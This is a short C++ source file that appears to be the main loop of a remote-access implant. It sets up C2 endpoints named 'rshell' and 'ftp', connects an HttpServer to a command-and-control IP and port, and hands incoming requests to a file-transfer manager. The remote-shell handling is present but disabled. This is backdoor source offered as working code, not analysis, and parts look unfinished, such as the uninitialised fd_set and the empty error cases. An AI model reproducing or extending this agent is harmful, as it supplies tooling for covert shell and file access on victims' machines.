#include <iostream>
#include "../../lib/agent/Agent.h"
#include "../../setting.h"

string                webRoot = "tsh";
std::map<string, int> CC_URL  = {
    {webRoot + "/rshell", 1},
    {webRoot + "/ftp", 2},
    {"", 3},
};
enum ReturnNum {
    SUCCESS = -100,
    ERROR,
    CLOSE,
};

int main() {
    // init httpserver
    HttpServer* agent = new HttpServer(cc_ip, cc_port, file_port);

    fd_set rd;
    int    ret;
    int    shellFd = agent->get_shellFd();
    int    fileFd  = agent->get_fileFd();

    // file manager
    // temporarily monitored and managed by the main thread
    while (1) {
        FD_SET(fileFd, &rd);

        if (select(fileFd + 1, &rd, NULL, NULL, NULL) < 0)
            return -1;
#if 0
        if ( FD_ISSET( shellFd, &rd ) )
        {
            //
        }
#endif
        if (FD_ISSET(fileFd, &rd)) {
            HttpRequest* httphandler = new HttpRequest(fileFd);

            switch (agent->_events_CC_readable(httphandler)) {
                case SUCCESS:
                    break;

                case CLOSE:

                    break;
                case ERROR:

                    break;
            }

            string path = httphandler->getQuery();

            FileManager::getInstance()->File_pushJob(
                std::bind(agent->getfile_, httphandler, path));
        }
    }

    return 0;
}